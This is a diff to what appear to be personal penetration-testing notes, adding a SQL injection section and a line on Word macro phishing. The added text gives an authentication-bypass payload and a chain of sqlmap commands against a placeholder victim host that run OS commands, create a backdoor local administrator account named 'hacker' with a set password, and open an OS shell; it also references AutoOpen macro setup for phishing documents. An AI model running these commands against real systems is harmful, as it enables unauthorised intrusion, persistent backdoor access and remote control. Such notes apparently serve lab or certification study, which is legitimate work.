@@ -65,6 +65,23 @@ if the above works then powershell shellcode runner
 
 ### SQL Vulnerability
 
+- try out with simple payloads first like:
+```
+' OR 1=1 -- //
+```
+- avoid using sites that redirect upon successful auth bypass, cause that will make any automated tools like SQLMap run slower and more unstable
+for sites that are vulnerable, capture the vulnerable parameter using Burpsuite, create a requests file to pass to sqlmap
+```bash
+# Manual sqlmapping
+sqlmap -u "http://<victim ip>/login.asp?user=a&password=a"
+# test for command execution
+sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-cmd=whoami --thread=10
+# if above okay, attempt to add new admin user
+sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-cmd="net user hacker P@ssw0rd123! /add" 
+sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-cmd="net localgroup administrators hacker /add"
+# try to get shell
+sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-shell
+```
 
 
 ### Email Phishing Vector
@@ -74,6 +91,7 @@ if the above works then powershell shellcode runner
 
 
 ### MSDoc Phishing
+- Assuming you know that you need to set up the DocumentOpen and AutoOpen functions
 - if .doc related, start off with a simple ping payload to check connectivity and command execution
 ```vba
 Sub MyMacro()
